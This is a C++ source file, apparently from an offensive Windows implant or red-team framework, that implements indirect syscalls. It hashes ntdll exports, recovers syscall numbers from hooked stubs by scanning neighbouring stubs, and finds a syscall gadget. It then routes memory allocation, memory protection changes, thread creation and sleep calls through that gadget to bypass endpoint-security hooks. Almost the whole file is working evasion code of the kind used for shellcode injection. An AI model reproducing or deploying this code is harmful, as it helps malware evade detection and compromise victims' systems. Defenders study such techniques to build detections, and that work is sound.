#include "IndirectSyscall.h"
#include "ApiLoader.h"
#include "ApiDefines.h"
#include "OpsecGadget.h"
#include "ProcLoader.h"

#if defined(_M_X64) || defined(__x86_64__)
extern "C" NTSTATUS AxIndirectSyscall2(ULONG ssn, PVOID gadget, ULONG_PTR ntArg1, ULONG_PTR ntArg2);
extern "C" NTSTATUS AxIndirectNtProtectFromArgs(ULONG ssn, PVOID gadget, INDIRECT_NT_PROTECT_ARGS *args);
extern "C" NTSTATUS AxIndirectNtAllocFromArgs(ULONG ssn, PVOID gadget, INDIRECT_NT_ALLOC_ARGS *args);
extern "C" NTSTATUS AxIndirectNtCreateThreadExFromArgs(ULONG ssn, PVOID gadget, INDIRECT_NT_CREATETHREADEX_ARGS *args);
#endif

static ULONG g_ssnNtDelayExecution = 0;
static ULONG g_ssnNtProtectVirtualMemory = 0;
static ULONG g_ssnNtAllocateVirtualMemory = 0;
static ULONG g_ssnNtCreateThreadEx = 0;
static PVOID g_syscallGadget = NULL;

static ULONG ReadSsnFromStub(PBYTE p)
{
	if (!p)
		return 0;
	if (p[0] == 0x4C && p[1] == 0x8B && p[2] == 0xD1 && p[3] == 0xB8)
		return *(ULONG*)(p + 4);
	if (p[0] == 0xE9) {
		LONG rel = *(LONG*)(p + 1);
		PBYTE t = p + 5 + rel;
		return ReadSsnFromStub(t);
	}
	if (p[0] == 0xEB) {
		CHAR rel8 = (CHAR)p[1];
		return ReadSsnFromStub(p + 2 + rel8);
	}
	return 0;
}

#if defined(_M_X64) || defined(__x86_64__)
static ULONG HaloPickSsn(PBYTE exportStub, HMODULE ntdll, PIMAGE_NT_HEADERS nth)
{
	ULONG s = ReadSsnFromStub(exportStub);
	if (s)
		return s;

	PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nth);
	for (WORD i = 0; i < nth->FileHeader.NumberOfSections; i++) {
		if (!(sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE))
			continue;
		PBYTE lo = (PBYTE)ntdll + sec[i].VirtualAddress;
		DWORD len = sec[i].Misc.VirtualSize;
		if ((ULONG_PTR)(exportStub - lo) >= len)
			continue;
		for (LONG d = -0x200; d <= 0x200; d += 0x20) {
			PBYTE q = exportStub + d;
			if (q < lo || q + 8 > lo + len)
				continue;
			s = ReadSsnFromStub(q);
			if (s)
				return s;
		}
		break;
	}
	return 0;
}
#endif

BOOL IndirectSyscall_Init(void)
{
	g_ssnNtDelayExecution = 0;
	g_ssnNtProtectVirtualMemory = 0;
	g_ssnNtAllocateVirtualMemory = 0;
	g_ssnNtCreateThreadEx = 0;
	g_syscallGadget = NULL;

	if (!SysModules || !SysModules->Ntdll || !ApiNt)
		return FALSE;

#if defined(_M_X64) || defined(__x86_64__)
	g_syscallGadget = Opsec_FindNtdllSyscallGadget();
	if (!g_syscallGadget)
		return FALSE;

	HMODULE ntdll = SysModules->Ntdll;
	auto* dos = (PIMAGE_DOS_HEADER)ntdll;
	if (dos->e_magic != IMAGE_DOS_SIGNATURE)
		return FALSE;
	auto* nth = (PIMAGE_NT_HEADERS)((ULONG_PTR)ntdll + dos->e_lfanew);
	if (nth->Signature != IMAGE_NT_SIGNATURE)
		return FALSE;

	PVOID delayExport = GetSymbolAddress(ntdll, HASH_FUNC_NTDELAYEXECUTION);
	PVOID protectExport = GetSymbolAddress(ntdll, HASH_FUNC_NTPROTECTVIRTUALMEMORY);
	PVOID allocExport = GetSymbolAddress(ntdll, HASH_FUNC_NTALLOCATEVIRTUALMEMORY);
	PVOID cteExport = GetSymbolAddress(ntdll, HASH_FUNC_NTCREATETHREADEX);

	if (delayExport)
		g_ssnNtDelayExecution = HaloPickSsn((PBYTE)delayExport, ntdll, nth);
	if (protectExport)
		g_ssnNtProtectVirtualMemory = HaloPickSsn((PBYTE)protectExport, ntdll, nth);
	if (allocExport)
		g_ssnNtAllocateVirtualMemory = HaloPickSsn((PBYTE)allocExport, ntdll, nth);
	if (cteExport)
		g_ssnNtCreateThreadEx = HaloPickSsn((PBYTE)cteExport, ntdll, nth);

	return g_ssnNtDelayExecution != 0 || g_ssnNtProtectVirtualMemory != 0 || g_ssnNtAllocateVirtualMemory != 0 ||
	       g_ssnNtCreateThreadEx != 0;
#else
	return FALSE;
#endif
}

BOOL IndirectSyscall_IsReady(void)
{
#if defined(_M_X64) || defined(__x86_64__)
	return g_syscallGadget != NULL &&
	       (g_ssnNtDelayExecution != 0 || g_ssnNtProtectVirtualMemory != 0 || g_ssnNtAllocateVirtualMemory != 0 ||
	        g_ssnNtCreateThreadEx != 0);
#else
	return FALSE;
#endif
}

NTSTATUS Indirect_NtDelayExecution(BOOLEAN alertable, PLARGE_INTEGER interval)
{
	if (!ApiNt || !ApiNt->NtDelayExecution)
		return (NTSTATUS)0xC0000001L;

#if defined(_M_X64) || defined(__x86_64__)
	if (g_syscallGadget && g_ssnNtDelayExecution) {
		return AxIndirectSyscall2(
		    g_ssnNtDelayExecution,
		    g_syscallGadget,
		    (ULONG_PTR)alertable,
		    (ULONG_PTR)interval);
	}
#endif
	return ApiNt->NtDelayExecution(alertable, interval);
}

NTSTATUS Indirect_NtProtectVirtualMemory(HANDLE processHandle, PVOID *baseAddress, PSIZE_T regionSize, ULONG newProtect, PULONG oldProtect)
{
	if (!ApiNt || !ApiNt->NtProtectVirtualMemory)
		return (NTSTATUS)0xC0000001L;

#if defined(_M_X64) || defined(__x86_64__)
	if (g_syscallGadget && g_ssnNtProtectVirtualMemory) {
		INDIRECT_NT_PROTECT_ARGS ia;
		ia.ProcessHandle = processHandle;
		ia.BaseAddress = baseAddress;
		ia.RegionSize = regionSize;
		ia.NewProtect = newProtect;
		ia.Pad = 0;
		ia.OldProtect = oldProtect;
		return AxIndirectNtProtectFromArgs(g_ssnNtProtectVirtualMemory, g_syscallGadget, &ia);
	}
#endif
	return ApiNt->NtProtectVirtualMemory(processHandle, baseAddress, regionSize, newProtect, oldProtect);
}

NTSTATUS Indirect_NtAllocateVirtualMemory(HANDLE processHandle, PVOID *baseAddress, ULONG_PTR zeroBits, PSIZE_T regionSize, ULONG allocationType, ULONG protect)
{
	if (!ApiNt || !ApiNt->NtAllocateVirtualMemory)
		return (NTSTATUS)0xC0000001L;

#if defined(_M_X64) || defined(__x86_64__)
	if (g_syscallGadget && g_ssnNtAllocateVirtualMemory) {
		INDIRECT_NT_ALLOC_ARGS ia;
		ia.ProcessHandle = processHandle;
		ia.BaseAddress = baseAddress;
		ia.ZeroBits = zeroBits;
		ia.RegionSize = regionSize;
		ia.AllocationType = allocationType;
		ia.Protect = protect;
		return AxIndirectNtAllocFromArgs(g_ssnNtAllocateVirtualMemory, g_syscallGadget, &ia);
	}
#endif
	return ApiNt->NtAllocateVirtualMemory(processHandle, baseAddress, zeroBits, regionSize, allocationType, protect);
}

LPVOID Indirect_VirtualAllocSensitive(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)
{
	if (!ApiNt || !ApiNt->NtAllocateVirtualMemory)
		return NULL;

	PVOID base = lpAddress;
	SIZE_T size = dwSize;
	NTSTATUS st = Indirect_NtAllocateVirtualMemory(NtCurrentProcess(), &base, 0, &size, flAllocationType, flProtect);
	if (!NT_SUCCESS(st))
		return NULL;
	return base;
}

NTSTATUS Indirect_NtCreateThreadEx(INDIRECT_NT_CREATETHREADEX_ARGS *args)
{
	if (!args || !ApiNt)
		return (NTSTATUS)0xC0000001L;

#if defined(_M_X64) || defined(__x86_64__)
	if (g_syscallGadget && g_ssnNtCreateThreadEx)
		return AxIndirectNtCreateThreadExFromArgs(g_ssnNtCreateThreadEx, g_syscallGadget, args);
#endif
	if (!ApiNt->NtCreateThreadEx)
		return (NTSTATUS)0xC0000001L;
	return ApiNt->NtCreateThreadEx(
	    args->ThreadHandle,
	    (ACCESS_MASK)args->DesiredAccess,
	    args->ObjectAttributes,
	    (HANDLE)args->ProcessHandle,
	    args->StartRoutine,
	    args->Argument,
	    (ULONG)args->CreateFlags,
	    (ULONG_PTR)args->ZeroBits,
	    (SIZE_T)args->SizeOfStackCommit,
	    (SIZE_T)args->SizeOfStackReserve,
	    args->AttributeList);
}

#if !defined(_M_X64) && !defined(__x86_64__)
extern "C" NTSTATUS AxIndirectSyscall2(ULONG ssn, PVOID gadget, ULONG_PTR ntArg1, ULONG_PTR ntArg2)
{
	(void)ssn;
	(void)gadget;
	if (!ApiNt || !ApiNt->NtDelayExecution)
		return (NTSTATUS)0xC0000001L;
	return ApiNt->NtDelayExecution((BOOLEAN)ntArg1, (PLARGE_INTEGER)ntArg2);
}

extern "C" NTSTATUS AxIndirectNtProtectFromArgs(ULONG ssn, PVOID gadget, INDIRECT_NT_PROTECT_ARGS *args)
{
	(void)ssn;
	(void)gadget;
	if (!ApiNt || !ApiNt->NtProtectVirtualMemory)
		return (NTSTATUS)0xC0000001L;
	return ApiNt->NtProtectVirtualMemory(args->ProcessHandle, args->BaseAddress, args->RegionSize, args->NewProtect, args->OldProtect);
}

extern "C" NTSTATUS AxIndirectNtAllocFromArgs(ULONG ssn, PVOID gadget, INDIRECT_NT_ALLOC_ARGS *args)
{
	(void)ssn;
	(void)gadget;
	if (!ApiNt || !ApiNt->NtAllocateVirtualMemory)
		return (NTSTATUS)0xC0000001L;
	return ApiNt->NtAllocateVirtualMemory(args->ProcessHandle, args->BaseAddress, args->ZeroBits, args->RegionSize, args->AllocationType, args->Protect);
}

extern "C" NTSTATUS AxIndirectNtCreateThreadExFromArgs(ULONG ssn, PVOID gadget, INDIRECT_NT_CREATETHREADEX_ARGS *args)
{
	(void)ssn;
	(void)gadget;
	if (!ApiNt || !ApiNt->NtCreateThreadEx)
		return (NTSTATUS)0xC0000001L;
	return ApiNt->NtCreateThreadEx(
	    args->ThreadHandle,
	    (ACCESS_MASK)args->DesiredAccess,
	    args->ObjectAttributes,
	    (HANDLE)args->ProcessHandle,
	    args->StartRoutine,
	    args->Argument,
	    (ULONG)args->CreateFlags,
	    (ULONG_PTR)args->ZeroBits,
	    (SIZE_T)args->SizeOfStackCommit,
	    (SIZE_T)args->SizeOfStackReserve,
	    args->AttributeList);
}
#endif
